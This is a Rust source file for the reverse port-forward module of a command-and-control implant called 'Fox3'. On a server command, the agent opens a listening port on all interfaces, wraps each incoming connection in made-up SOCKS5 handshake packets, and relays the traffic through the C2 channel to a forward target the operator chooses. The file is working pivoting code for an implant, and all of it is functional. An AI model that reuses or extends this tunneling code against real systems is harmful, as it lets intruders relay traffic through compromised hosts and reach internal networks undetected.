/// Reverse (remote) port-forward for the Fox3 agent.
///
/// The server sends `rportfwd_start` (NATIVE command) with a listen-port.
/// The agent binds that port and accepts connections.  For each accepted
/// connection the agent synthesises a SOCKS5 greeting + CONNECT and sends
/// them to the server as `JOB_SOCKS` packets via the shared outbound queue.
/// The server-side `rportfwd.In()` processes them (connects to the configured
/// forward target) and replies with SOCKS5 responses + data.
///
/// Data flow:
///   remote client → agent(listen port) → C2 → server → forward host:port
///
/// The agent acts as SOCKS5 *client* (initiator) for rportfwd, unlike normal
/// SOCKS where the agent is the server.

use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{Shutdown, TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex, OnceLock};
use std::thread;

use uuid::Uuid;

use std::time::Duration;

use crate::protocol::SocksPayload;
use crate::socks::{SocksOut, WakeSignal};

/// Maximum number of outbound SOCKS packets queued before dropping oldest 25%.
const MAX_OUTBOUND: usize = 500;

// ── Per-connection state (agent is SOCKS client) ─────────────────────────────

#[derive(Debug)]
enum RpfState {
    /// Sent greeting (index 0), waiting for server's method selection reply.
    WaitMethodSelect,
    /// Sent CONNECT (index 1), waiting for server's CONNECT reply.
    WaitConnectReply,
    /// Tunnel established — forwarding data bidirectionally.
    Established,
}

struct RpfConn {
    stream: TcpStream, // write half (to accepted TCP client)
    state: RpfState,
    recv_idx: i32,
    pending: HashMap<i32, (Vec<u8>, bool)>, // buffered out-of-order: (data, close)
}

// ── Global connection registry ───────────────────────────────────────────────
//
// Shared between accept-loop threads (insert) and main thread (handle_incoming).

fn conns_map() -> &'static Mutex<HashMap<Uuid, RpfConn>> {
    static MAP: OnceLock<Mutex<HashMap<Uuid, RpfConn>>> = OnceLock::new();
    MAP.get_or_init(|| Mutex::new(HashMap::new()))
}

// ── Manager ──────────────────────────────────────────────────────────────────

pub struct RPortFwdManager {
    /// Active listener stop flags, keyed by port.
    listeners: Vec<(u16, Arc<AtomicBool>)>,
    /// Shared outbound queue (same as SocksManager).
    outbound: Arc<Mutex<Vec<SocksOut>>>,
    wake: WakeSignal,
    agent_id: Uuid,
}

impl RPortFwdManager {
    pub fn new(
        outbound: Arc<Mutex<Vec<SocksOut>>>,
        wake: WakeSignal,
        agent_id: Uuid,
    ) -> Self {
        Self {
            listeners: Vec::new(),
            outbound,
            wake,
            agent_id,
        }
    }

    /// Start listening on the given port.
    pub fn start(&mut self, port: u16) -> Result<String, String> {
        if self.listeners.iter().any(|(p, _)| *p == port) {
            return Err(format!("rportfwd: already listening on port {}", port));
        }

        let addr = format!("0.0.0.0:{}", port);
        let listener = TcpListener::bind(&addr)
            .map_err(|e| format!("rportfwd: bind {}: {}", addr, e))?;

        let stop = Arc::new(AtomicBool::new(false));
        self.listeners.push((port, Arc::clone(&stop)));

        let outbound = Arc::clone(&self.outbound);
        let wake = self.wake.clone_ref();
        let agent_id = self.agent_id;

        thread::Builder::new()
            .name(format!("rpf-accept-{}", port))
            .spawn(move || {
                accept_loop(listener, stop, outbound, wake, agent_id);
            })
            .map_err(|e| format!("rportfwd: spawn: {}", e))?;

        Ok(format!("rportfwd: listening on 0.0.0.0:{}", port))
    }

    /// Stop all reverse port-forward listeners and close connections.
    pub fn stop(&mut self) -> String {
        if self.listeners.is_empty() {
            return "rportfwd: no active listeners".to_string();
        }
        let count = self.listeners.len();
        for (_, stop) in &self.listeners {
            stop.store(true, Ordering::SeqCst);
        }
        // Unblock accept() by connecting to each listener
        for (port, _) in &self.listeners {
            let _ = TcpStream::connect(format!("127.0.0.1:{}", port));
        }
        self.listeners.clear();
        // Close all active rportfwd connections
        let mut map = conns_map().lock().unwrap_or_else(|e| e.into_inner());
        for (_, conn) in map.drain() {
            let _ = conn.stream.shutdown(Shutdown::Both);
        }
        format!("rportfwd: stopped {} listener(s)", count)
    }

    /// True if there are active rportfwd connections (drives interactive mode).
    pub fn has_active(&self) -> bool {
        // Check listeners (cheap) first
        if self.listeners.is_empty() {
            return false;
        }
        // If listeners exist, check for actual connections
        !conns_map().lock().unwrap_or_else(|e| e.into_inner()).is_empty()
    }

    /// Check if a connection UUID belongs to rportfwd.
    pub fn is_known(conn_id: Uuid) -> bool {
        conns_map().lock().unwrap_or_else(|e| e.into_inner()).contains_key(&conn_id)
    }

    /// Process an incoming JOB_SOCKS from the server for an rportfwd connection.
    ///
    /// Returns `true` if the packet was handled (conn_id belongs to rportfwd).
    /// Returns `false` if unknown — caller should fall through to SocksManager.
    pub fn handle_incoming(job: &crate::protocol::Job) -> bool {
        let payload = match job
            .payload
            .as_ref()
            .and_then(|v| serde_json::from_value::<SocksPayload>(v.clone()).ok())
        {
            Some(p) => p,
            None => return false,
        };

        let conn_id = payload.id;
        let mut map = conns_map().lock().unwrap_or_else(|e| e.into_inner());

        let conn = match map.get_mut(&conn_id) {
            Some(c) => c,
            None => return false,
        };

        // Buffer out-of-order
        if payload.index != conn.recv_idx {
            conn.pending
                .insert(payload.index, (payload.decode_data(), payload.close));
            return true;
        }

        let mut cur_data = payload.decode_data();
        let mut cur_close = payload.close;

        loop {
            conn.recv_idx += 1;

            if cur_close {
                let _ = conn.stream.shutdown(Shutdown::Both);
                map.remove(&conn_id);
                return true;
            }

            match conn.state {
                RpfState::WaitMethodSelect => {
                    // Server replied with method selection [0x05, 0x00] — advance
                    conn.state = RpfState::WaitConnectReply;
                }
                RpfState::WaitConnectReply => {
                    // Server replied with CONNECT result
                    if cur_data.len() >= 2 && cur_data[1] == 0x00 {
                        // Success — tunnel established
                        conn.state = RpfState::Established;
                    } else {
                        // CONNECT failed — close the client
                        crate::dbg_print!("[rportfwd] server rejected CONNECT");
                        let _ = conn.stream.shutdown(Shutdown::Both);
                        map.remove(&conn_id);
                        return true;
                    }
                }
                RpfState::Established => {
                    if !cur_data.is_empty() {
                        if conn.stream.write_all(&cur_data).is_err() {
                            let _ = conn.stream.shutdown(Shutdown::Both);
                            map.remove(&conn_id);
                            return true;
                        }
                    }
                }
            }

            // Drain buffered in-order packets
            let next = conn.recv_idx;
            if let Some((data, close)) = conn.pending.remove(&next) {
                cur_data = data;
                cur_close = close;
            } else {
                break;
            }
        }

        true
    }
}

// ── Accept loop ──────────────────────────────────────────────────────────────

fn accept_loop(
    listener: TcpListener,
    stop: Arc<AtomicBool>,
    outbound: Arc<Mutex<Vec<SocksOut>>>,
    wake: WakeSignal,
    agent_id: Uuid,
) {
    loop {
        let (stream, peer) = match listener.accept() {
            Ok(s) => s,
            Err(_) => {
                if stop.load(Ordering::SeqCst) {
                    return;
                }
                continue;
            }
        };

        if stop.load(Ordering::SeqCst) {
            let _ = stream.shutdown(Shutdown::Both);
            return;
        }

        crate::dbg_print!("[rportfwd] connection from {}", peer);

        let conn_id = Uuid::new_v4();
        let job_id = format!("rpf-{}", &conn_id.to_string()[..8]);
        let token = Uuid::new_v4();

        // Clone stream: one for background reader, one stored for writing
        let read_stream = match stream.try_clone() {
            Ok(s) => s,
            Err(e) => {
                crate::dbg_print!("[rportfwd] clone stream: {}", e);
                continue;
            }
        };

        // Register connection for handle_incoming
        conns_map().lock().unwrap_or_else(|e| e.into_inner()).insert(
            conn_id,
            RpfConn {
                stream,
                state: RpfState::WaitMethodSelect,
                recv_idx: 0,
                pending: HashMap::new(),
            },
        );

        // Queue SOCKS5 greeting (index 0) + CONNECT (index 1)
        // The server-side rportfwd module ignores the CONNECT target and uses
        // its own forwardTargets map, so we send a dummy address.
        {
            let mut q = outbound.lock().unwrap_or_else(|e| e.into_inner());
            if q.len() >= MAX_OUTBOUND {
                let drop_count = q.len() / 4;
                q.drain(..drop_count);
            }
            q.push(SocksOut {
                conn_id,
                job_id: job_id.clone(),
                token,
                agent_id,
                index: 0,
                data: vec![0x05, 0x01, 0x00], // VER=5, NMETHODS=1, METHOD=0
                close: false,
            });
            q.push(SocksOut {
                conn_id,
                job_id: job_id.clone(),
                token,
                agent_id,
                index: 1,
                data: vec![
                    0x05, 0x01, 0x00, 0x01, // VER, CMD=CONNECT, RSV, ATYP=IPv4
                    0x00, 0x00, 0x00, 0x00, // addr: 0.0.0.0
                    0x00, 0x00, // port: 0
                ],
                close: false,
            });
        }
        wake.notify();

        // Spawn background reader (TCP client → server)
        let outbound_ref = Arc::clone(&outbound);
        let wake_ref = wake.clone_ref();
        let send_idx = Arc::new(Mutex::new(2i32)); // 0=greeting, 1=CONNECT already sent

        if let Err(e) = thread::Builder::new()
            .name(format!("rpf-rd-{}", &conn_id.to_string()[..8]))
            .spawn(move || {
                rpf_reader(
                    conn_id,
                    read_stream,
                    outbound_ref,
                    wake_ref,
                    job_id,
                    token,
                    agent_id,
                    send_idx,
                );
            })
        {
            crate::dbg_print!("[rportfwd] failed to spawn reader thread: {}", e);
            conns_map().lock().unwrap_or_else(|e| e.into_inner()).remove(&conn_id);
            continue;
        }
    }
}

// ── Background reader ────────────────────────────────────────────────────────

fn rpf_reader(
    conn_id: Uuid,
    mut stream: TcpStream,
    outbound: Arc<Mutex<Vec<SocksOut>>>,
    wake: WakeSignal,
    job_id: String,
    token: Uuid,
    agent_id: Uuid,
    send_idx: Arc<Mutex<i32>>,
) {
    let mut buf = [0u8; 32768];

    // 2-minute read timeout prevents truly stuck threads.
    stream.set_read_timeout(Some(Duration::from_secs(120))).ok();

    loop {
        match stream.read(&mut buf) {
            Ok(0) => {
                let idx = next_idx(&send_idx);
                let mut q = outbound.lock().unwrap_or_else(|e| e.into_inner());
                if q.len() >= MAX_OUTBOUND {
                    let drop_count = q.len() / 4;
                q.drain(..drop_count);
                }
                q.push(SocksOut {
                    conn_id,
                    job_id,
                    token,
                    agent_id,
                    index: idx,
                    data: vec![],
                    close: true,
                });
                drop(q);
                wake.notify();
                conns_map().lock().unwrap_or_else(|e| e.into_inner()).remove(&conn_id);
                return;
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock
                       || e.kind() == std::io::ErrorKind::TimedOut => {
                // Read timeout — connection is idle but alive, retry
                continue;
            }
            Err(_) => {
                let idx = next_idx(&send_idx);
                let mut q = outbound.lock().unwrap_or_else(|e| e.into_inner());
                if q.len() >= MAX_OUTBOUND {
                    let drop_count = q.len() / 4;
                q.drain(..drop_count);
                }
                q.push(SocksOut {
                    conn_id,
                    job_id,
                    token,
                    agent_id,
                    index: idx,
                    data: vec![],
                    close: true,
                });
                drop(q);
                wake.notify();
                conns_map().lock().unwrap_or_else(|e| e.into_inner()).remove(&conn_id);
                return;
            }
            Ok(n) => {
                let idx = next_idx(&send_idx);
                let mut q = outbound.lock().unwrap_or_else(|e| e.into_inner());
                if q.len() >= MAX_OUTBOUND {
                    let drop_count = q.len() / 4;
                q.drain(..drop_count);
                }
                q.push(SocksOut {
                    conn_id,
                    job_id: job_id.clone(),
                    token,
                    agent_id,
                    index: idx,
                    data: buf[..n].to_vec(),
                    close: false,
                });
                drop(q);
                wake.notify();
            }
        }
    }
}

fn next_idx(counter: &Arc<Mutex<i32>>) -> i32 {
    let mut i = counter.lock().unwrap_or_else(|e| e.into_inner());
    let v = *i;
    *i += 1;
    v
}
